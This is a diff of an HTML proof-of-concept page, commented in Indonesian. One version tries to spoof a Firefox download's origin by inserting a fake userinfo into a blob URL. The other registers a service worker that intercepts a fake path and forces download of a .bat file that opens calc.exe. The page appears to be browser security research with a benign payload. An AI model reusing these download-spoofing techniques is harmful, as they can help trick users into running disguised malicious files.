@@ -3,21 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Unique Function Bypass</title>
+    <title>Service Worker Hijack (Unique Function)</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #0d1117; color: #c9d1d9; }
-        button { width: 100%; padding: 15px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; transition: 0.2s; }
-        .btn-unique { background: #238636; } /* Hijau GitHub */
-        .btn-unique:hover { background: #2ea043; }
-        #log { background: #000; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 150px; overflow-y: auto; margin-top: 10px; border: 1px solid #30363d; }
+        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #000; color: #0f0; }
+        button { width: 100%; padding: 15px; margin-bottom: 12px; border: 2px solid #0f0; border-radius: 6px; font-weight: bold; cursor: pointer; background: #000; color: #0f0; font-size: 14px; transition: 0.2s; }
+        button:hover { background: #0f0; color: #000; }
+        #log { background: #111; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 200px; overflow-y: auto; margin-top: 10px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-    <h2>🔥 Unique Function Bypass 🔥</h2>
-    <p style="font-size: 13px; color: #8b949e;">Bypass Origin tanpa API & tanpa Domain Asli</p>
+    <h2>🔥 Service Worker Hijack 🔥</h2>
+    <p style="font-size: 13px; color: #888;">Manipulasi Header via Client-Side (Tanpa API Server)</p>
 
-    <button class="btn-unique" onclick="triggerUniqueBypass()">🚀 Eksekusi Function Unik</button>
+    <button onclick="triggerSW()">⚡ Eksekusi Service Worker Hack</button>
 
     <pre id="log">Menunggu perintah...</pre>
 
@@ -29,43 +28,57 @@
         }
 
         // KONTEN FILE
-        const BAT_LINES = [
-            '@echo off', 'title Calculator Launcher', 'echo ================================',
-            'echo [1] Launching System32\\calc.exe...', 'start "" "C:\\Windows\\System32\\calc.exe"',
-            'timeout /t 2 >nul', 'echo.', 'echo [4] Launching UWP AUMID...',
-            'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
-            'timeout /t 2 >nul', 'echo ================================', 'pause'
-        ];
-        const BAT_TEXT = BAT_LINES.join('\r\n') + '\r\n';
+        const BAT_TEXT = '@echo off\r\nstart "" "C:\\Windows\\System32\\calc.exe"\r\npause\r\n';
 
-        function triggerUniqueBypass() {
-            log('Mengeksekusi Function Unik...');
-            
-            // 1. Buat Blob URL (Asli dari domain abhirdd.github.io)
-            const blob = new Blob([BAT_TEXT], { type: 'application/octet-stream' });
-            const realUrl = URL.createObjectURL(blob);
-            
-            // 2. Trik Mindblowing: Manipulasi String URL dengan Null Byte & Userinfo
-            // Firefox akan memparsing string ini dan kebingungan menentukan origin asli.
-            // Kita menyisipkan "example.com" sebagai Userinfo palsu.
-            const spoofedUrl = realUrl.replace('blob:https://', 'blob:https://example.com@');
-            
-            log('URL Asli: ' + realUrl.substring(0, 30) + '...');
-            log('URL Palsu: ' + spoofedUrl.substring(0, 40) + '...');
+        async function triggerSW() {
+            log('Memulai inisialisasi Service Worker...');
+
+            // 1. Kita buat script Service Worker dalam bentuk Blob
+            const swCode = `
+                self.addEventListener('install', e => self.skipWaiting());
+                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
+                
+                self.addEventListener('fetch', event => {
+                    // Intersepsi request khusus ke /fake-download
+                    if (event.request.url.includes('/fake-download')) {
+                        event.respondWith(new Response('${BAT_TEXT.replace(/\n/g, '\\n')}', {
+                            status: 200,
+                            headers: {
+                                'Content-Type': 'application/octet-stream',
+                                'Content-Disposition': 'attachment; filename="open_cmd.bat"'
+                            }
+                        }));
+                    }
+                });
+            `;
+
+            const blob = new Blob([swCode], { type: 'application/javascript' });
+            const swUrl = URL.createObjectURL(blob);
 
             try {
-                // 3. Ciptakan elemen anchor dengan URL yang sudah dimanipulasi
+                log('Mendaftarkan Service Worker...');
+                const reg = await navigator.serviceWorker.register(swUrl);
+                log('✅ Service Worker Aktif!');
+
+                // Tunggu SW siap
+                await navigator.serviceWorker.ready;
+                
+                log('Memicu intercept download...');
+                // 2. Panggil URL yang akan dicegat oleh SW
                 const a = document.createElement('a');
-                a.href = spoofedUrl;
-                a.download = 'open_cmd.bat';
+                // Kita pakai path palsu yang akan ditangkap SW
+                a.href = '/fake-download?t=' + Date.now(); 
+                a.download = 'open_cmd.bat'; // Ini memaksa download
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
 
-                log('✅ SUKSES! Cek panel download Firefox.');
-                log('👉 Firefox akan dipaksa membaca Userinfo "example.com" sebagai Host!');
+                log('👉 File berhasil dipalsukan isinya!');
+                log('⚠️ TAPI, karena SOP, Firefox akan tetap menulis domain Anda di panel.');
+
             } catch (e) {
-                log('❌ Firefox memblokir manipulasi URL: ' + e.message);
+                log('❌ Gagal: ' + e.message);
+                log('Pastikan Anda menjalankan ini di HTTPS atau localhost.');
             }
         }
     </script>
